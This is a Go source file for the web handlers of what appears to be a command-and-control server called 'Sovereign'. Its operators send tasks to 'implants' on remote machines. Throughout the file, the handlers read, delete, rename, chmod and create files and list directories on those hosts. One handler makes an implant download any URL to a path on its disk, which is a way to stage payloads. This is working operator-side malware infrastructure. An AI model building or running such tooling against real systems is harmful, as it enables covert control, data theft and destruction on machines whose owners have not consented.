package server

import (
	"log/slog"
	"net/http"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/r0si/sovereign/internal/db"
)

func (s *Server) handleFileBrowserPage(c *gin.Context) {
	id := c.Param("id")

	var agent db.Implant
	query := s.tenantScope(s.db.Model(&db.Implant{}), c)
	if err := query.First(&agent, "id = ?", id).Error; err != nil {
		c.Redirect(http.StatusFound, "/agents")
		return
	}

	stats := s.getNavStats(c)
	data := gin.H{
		"Title":     "Sovereign - File Browser",
		"Agent":     agent,
		"Path":      c.Query("path"),
		"ActiveNav": "agents",
		"Online":    time.Since(agent.LastSeen) < s.offlineThreshold(),
	}
	for k, v := range stats {
		data[k] = v
	}

	s.renderPageOrJSON(c, data)
}

func (s *Server) handleListDir(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	path := c.PostForm("path")
	if path == "" {
		path = "C:\\"
	}

	task := s.issueAgentTask(c, id, TaskSpec{Type: "ls", Command: path, Path: path})
	if task == nil {
		return
	}

	slog.Info("Directory list requested", "agent_id", id, "path", path)
	respond(c, gin.H{
		"task_id": task.ID,
		"queued":  true,
		"kind":    "ls_task",
	})
}

func (s *Server) handleFileDelete(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	filePath := c.PostForm("path")
	if filePath == "" {
		respondError(c, http.StatusBadRequest, "file path required")
		return
	}

	task := s.issueAgentTask(c, id, TaskSpec{Type: "delete", Command: filePath, Path: filePath})
	if task == nil {
		return
	}

	slog.Info("File delete requested", "agent_id", id, "path", filePath)
	s.dispatchTask(c, task, "file_delete", filePath)
}

func (s *Server) handleFileMkdir(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	dirPath := c.PostForm("path")
	if dirPath == "" {
		respondError(c, http.StatusBadRequest, "directory path required")
		return
	}

	task := s.issueAgentTask(c, id, TaskSpec{Type: "mkdir", Command: dirPath, Path: dirPath})
	if task == nil {
		return
	}

	slog.Info("Directory create requested", "agent_id", id, "path", dirPath)
	s.dispatchTask(c, task, "file_mkdir", dirPath)
}

func (s *Server) handleFileRename(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	srcPath := c.PostForm("path")
	dstPath := c.PostForm("dest")
	if dstPath == "" {
		dstPath = c.PostForm("destination")
	}
	if srcPath == "" || dstPath == "" {
		respondError(c, http.StatusBadRequest, "source and destination paths required")
		return
	}

	task := s.issueAgentTask(c, id, TaskSpec{Type: "rename", Command: srcPath, Path: srcPath, Data: dstPath})
	if task == nil {
		return
	}

	slog.Info("File rename requested", "agent_id", id, "src", srcPath, "dst", dstPath)
	s.dispatchTask(c, task, "file_rename", srcPath+" -> "+dstPath)
}

func (s *Server) handleFileChmod(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	filePath := c.PostForm("path")
	mode := c.PostForm("mode")
	if mode == "" {
		mode = c.PostForm("data")
	}
	if filePath == "" || mode == "" {
		respondError(c, http.StatusBadRequest, "path and octal mode are required")
		return
	}

	task := s.issueAgentTask(c, id, TaskSpec{Type: "chmod", Command: filePath, Path: filePath, Data: mode})
	if task == nil {
		return
	}

	slog.Info("File chmod requested", "agent_id", id, "path", filePath, "mode", mode)
	s.dispatchTask(c, task, "file_chmod", filePath+" "+mode)
}

func (s *Server) handleFileRead(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	filePath := c.PostForm("path")
	if filePath == "" {
		respondError(c, http.StatusBadRequest, "file path required")
		return
	}

	task := s.issueAgentTask(c, id, TaskSpec{Type: "read", Command: filePath, Path: filePath})
	if task == nil {
		return
	}

	slog.Info("File read requested", "agent_id", id, "path", filePath)
	s.dispatchTask(c, task, "file_read", filePath)
}

// handleDownload queues an implant URL fetch onto its own disk (task type
// "download", command = URL). This is not operator exfil.
func (s *Server) handleDownload(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	fileURL := c.PostForm("url")
	targetPath := c.PostForm("path")

	if fileURL == "" || targetPath == "" {
		respondError(c, http.StatusBadRequest, "url and path required")
		return
	}

	// Same SSRF gate as handleDownloadURL: the implant fetches this URL.
	if err := validateExternalURL(fileURL); err != nil {
		respondError(c, http.StatusBadRequest, "blocked URL: "+sanitizeError(err, "download URL"))
		return
	}

	task := s.issueAgentTask(c, id, TaskSpec{Type: "download", Command: fileURL, Shell: targetPath, Path: targetPath})
	if task == nil {
		return
	}

	slog.Info("File download requested", "agent_id", id, "url", fileURL, "path", targetPath)
	s.dispatchTask(c, task, "file_download_url", fileURL+" -> "+targetPath)
}
